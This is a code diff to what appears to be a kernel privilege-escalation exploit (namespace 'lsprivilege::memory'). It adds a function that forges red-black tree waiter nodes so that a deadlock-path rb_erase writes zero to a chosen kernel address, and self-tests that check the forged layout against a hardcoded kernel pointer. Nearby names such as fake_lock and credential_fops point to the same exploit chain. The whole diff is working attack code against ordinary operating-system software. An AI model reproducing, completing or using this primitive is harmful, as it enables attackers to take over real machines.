@@ -53,6 +53,26 @@ namespace lsprivilege::memory {
                span_store64(buffer, waiter_offset + lock_offset, fake_lock);
     }
 
+    bool encode_multicast_waiter_trees(std::span<std::byte> buffer,
+                                       size_t waiter_offset, size_t pi_tree_offset,
+                                       uintptr_t target) noexcept {
+        if (!target) return false;
+        const uint64_t leaf_parent = static_cast<uint64_t>(target) - 8;
+        return span_store64(buffer, waiter_offset, leaf_parent) &&
+               span_store64(buffer, waiter_offset + 0x08, 0) &&
+               span_store64(buffer, waiter_offset + 0x10, 0) &&
+               span_store64(buffer, waiter_offset + pi_tree_offset, leaf_parent) &&
+               span_store64(buffer, waiter_offset + pi_tree_offset + 0x08, 0) &&
+               span_store64(buffer, waiter_offset + pi_tree_offset + 0x10, 0);
+    }
+
+    uint64_t load_stamp_u64(const unsigned char *buffer, size_t size, size_t offset) noexcept {
+        if (!buffer || offset > size || sizeof(uint64_t) > size - offset) return 0;
+        uint64_t value;
+        memcpy(&value, buffer + offset, sizeof(value));
+        return value;
+    }
+
     PayloadWriteLayout payload_write_layout(
         const WriteRequest *request, uintptr_t page_base,
         uintptr_t default_fops, uintptr_t credential_fops,
@@ -177,6 +197,34 @@ namespace lsprivilege::memory {
         std::array<std::byte, 0x40> multicast_small{};
         if (encode_multicast_waiter(
             multicast_small, 0x20, 0x28, 0x30, 0x1111, 0x2222))
+            return 0;
+
+        /* Tree planting: parent = target-8 with zero children in both rb_node
+         * slots makes the EDEADLK rb_erase write *(target)=0. */
+        std::array<std::byte, 0x60> tree_stamp{};
+        const uintptr_t tree_target = 0xffffff802ac6b4dcULL;
+        if (!encode_multicast_waiter_trees(tree_stamp, 0x20, 0x18, tree_target))
+            return 0;
+        if (load_stamp_u64(reinterpret_cast<const unsigned char *>(tree_stamp.data()),
+                           tree_stamp.size(), 0x20) != tree_target - 8 ||
+            load_stamp_u64(reinterpret_cast<const unsigned char *>(tree_stamp.data()),
+                           tree_stamp.size(), 0x28) != 0 ||
+            load_stamp_u64(reinterpret_cast<const unsigned char *>(tree_stamp.data()),
+                           tree_stamp.size(), 0x30) != 0 ||
+            load_stamp_u64(reinterpret_cast<const unsigned char *>(tree_stamp.data()),
+                           tree_stamp.size(), 0x38) != tree_target - 8 ||
+            load_stamp_u64(reinterpret_cast<const unsigned char *>(tree_stamp.data()),
+                           tree_stamp.size(), 0x40) != 0 ||
+            load_stamp_u64(reinterpret_cast<const unsigned char *>(tree_stamp.data()),
+                           tree_stamp.size(), 0x48) != 0)
+            return 0;
+        if (encode_multicast_waiter_trees(tree_stamp, 0x20, 0x18, 0)) return 0;
+        /* A zero target refuses; out-of-range reads yield 0. */
+        if (load_stamp_u64(reinterpret_cast<const unsigned char *>(tree_stamp.data()),
+                           tree_stamp.size(), tree_stamp.size()) != 0)
+            return 0;
+        std::array<std::byte, 0x18> tree_small{};
+        if (encode_multicast_waiter_trees(tree_small, 0x8, 0x18, tree_target))
             return 0;
         return 1;
     }
